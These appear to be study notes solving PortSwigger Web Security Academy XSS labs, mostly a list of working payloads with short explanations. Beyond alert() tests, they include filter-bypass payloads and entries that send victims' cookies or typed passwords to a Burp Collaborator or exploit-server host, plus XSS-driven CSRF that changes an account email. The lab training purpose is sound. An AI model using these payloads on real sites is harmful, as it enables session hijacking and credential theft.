# Cross-site scripting

## Description

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

### Reflected XSS into HTML context with nothing encoded

```
Try to copy into the search button
<script>alert(1)</script>
```

### Reflected XSS into HTML context with nothing encoded

```
Try to comment, into the post:

<script>alert(1)</script>

```

### DOM XSS in document.write sink using source location.search

```
"><svg onload=alert(1)>

or '"><script>alert(1)</script>

Code back-end:

<img src="/resources/images/tracker.gif?searchTerms='"><script>alert(1)</script>">

```

### DOM XSS in innerHTML sink using source location.search

```
<img src=1 onerror=alert(1)>

Code back-end: 

document.getElementById('searchMessage').innerHTML = query;
```

### DOM XSS in jQuery anchor href attribute sink using location.search source

```

https://0a20003f04743d5ec08545da00c300b3.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)

javascriptCode:
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));

```

### DOM XSS in jQuery selector sink using a hashchange event

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
```
### Reflected XSS into attribute with angle brackets HTML-encoded

```
GET /?search="onmouseover="alert(1)
Replace your input with the following payload to escape the quoted attribute and inject an event handler:
<input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert(1)">
```

### Stored XSS into anchor href attribute with double quotes HTML-encoded

```
<label>Website:</label>
<input type="text" name="website">

EXPLOIT: javascript:alert(1)
```
### Reflected XSS into a JavaScript string with angle brackets HTML encoded

```
Use the search function in the response
 <script>
    var searchTerms = 'test';

EXPLOIT: '-alert(1)-'

Result: var searchTerms = ''-alert(1)-'';
    
```
### DOM XSS in document.write sink using source location.search inside a select element
```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>

CODE: 
var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
```


### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

```
Angular 1.7.7

On search term:
{{$on.constructor('alert(1)')()}}
```
### Reflected DOM XSS

```
searchTerm=\"-alert(1)}//

Response:
{"results":[],"searchTerm":"\\"-alert(1)//"}

Back-End:
eval('var searchResultsObj = ' + this.responseText);
```

### Stored DOM XSS

```
   function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
    
<><img src=1 onerror=alert(1)>
```

### Exploiting cross-site scripting to steal cookies

```
Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:

<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```


### Exploiting cross-site scripting to capture passwords

```

Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
### Exploiting XSS to perform CSRF

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### Reflected XSS into HTML context with most tags and attributes blocked

```
Error: "Tag is not allowed"

Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: <§§>
Visit the XSS cheat sheet and click "Copy tags to clipboard".

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
### Reflected XSS into HTML context with all tags blocked except custom ones

```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.

possible sample:
2	a2	200	false	false	4006	
6	animate	200	false	false	4011	
7	animatemotion	200	false	false	4017	
8	animatetransform	200	false	false	4020	
14	audio2	200	false	false	4010	
33	custom tags	200	false	false	4015	
64	iframe2	200	false	false	4011	
66	image2	200	false	false	4010	
67	image3	200	false	false	4010	
69	img2	200	false	false	4008	
71	input2	200	false	false	4010	
72	input3	200	false	false	4010	
73	input4	200	false	false	4010	
119	set	200	false	false	4007	
150	video2	200	false	false	4010	
1	a	400	false	false	134	
```


### Reflected XSS with some SVG markup allowed

```
<svg><animatetransform%20=1>

<svg><animatetransform%20§§=1>

https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

```
### Reflected XSS in canonical link tag
```
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

To trigger the exploit on yourself, press one of the following key combinations:
On Windows: ALT+SHIFT+X
On MacOS: CTRL+ALT+X
On Linux: Alt+X

```
### Reflected XSS into a JavaScript string with single quote and backslash escaped

```
test'payload and observe that your single quote gets backslash-escaped,
</script><script>alert(1)</script>

```

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

```
Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
Try sending the payload test\payload and observe that your backslash doesn't get escaped.
Replace your input with the following payload to break out of the JavaScript string and inject an alert:

\'-alert(1)//
```
### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

```
Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert, using the following payload:

http://foo?&apos;-alert(1)-&apos;
```
### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

                           var message = `0 search results for '\u0027\u0022\u003e\u003cscript\u003ealert(1)\u003c/script\u003e'`;
Search for highlight on burp intruder                           
 var message = `0 search results for '${{77*77}}'`;

${alert(1)}



In some cases insert this into the javascript code
-alert(1)- OR "-alert(1)-" OR to bypass document cookie filter use "-alert(window["document"]["cookie"])-" This way of bypassing is exploiting through global variable

Example to Bypass (double encode (on the point character), and other encoding as follow:)
location='https://ac701f751f8f348b80171ec10036004a.web-security-academy.net/?search_term=%22-%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Fexploit-ace61f411f22344280191eb3016d00ea%252eweb-security-academy%252enet%2F%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29-%22';
location='https://ac701f751f8f348b80171ec10036004a.web-security-academy.net/?search_term="-(window["document"]["location"]="https://exploit-ace61f411f22344280191eb3016d00ea%2eweb-security-academy%2enet//?"+window["document"]["cookie"])-"';
location='https://ac701f751f8f348b80171ec10036004a.web-security-academy.net/?search_term="-(window["document"]["location"]="https://exploit-ace61f411f22344280191eb3016d00ea.web-security-academy.net//?"+window["document"]["cookie"])-"';

Final Payload:
<script>
location='https://0a3b0073048f9f64c09f603800e300d4.web-security-academy.net/?SearchTerm=%22-%28window%5b"document"%5d%5b"location"%5d="https%3A%2F%2Fexploit-0ad8007804719f42c071600b013200c0%252eweb-security-academy%252enet%2F%3F%22%2Bwindow%5b%22document%22%5d%5b%22cookie%22%5d%29-"'
</script>



 
 <svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>Click me</text></a>

Example for a Stored XSS to retrive cookie session through comment

<script>document.location='//exploit-0adb00eb0408b931c0c44d7d01d90077.web-security-academy.net/'+document.cookie</script>

This exploit will redirect the user, once the request is loaded to your exploit server, where you can find his own cookie session




--------------------------------------------------------------------------

Example of Reflected XSS through a cookie, in mix with cache poisoning (remember to test the exploit with the cache buster)

request

GET /?c=12 HTTP/1.1
Host: 0af4009303eacff9c0044ae1009c009f.web-security-academy.net
Upgrade-Insecure-Requests: 1
Cookie:fehost=someString"-alert(1)-"someString

response (part of it)

       <script>
            data = {
                "host":"0af4009303eacff9c0044ae1009c009f.web-security-academy.net",
                "path":"/",
                "frontend":"someString"-alert(1)-"someString"
            }
        </script>
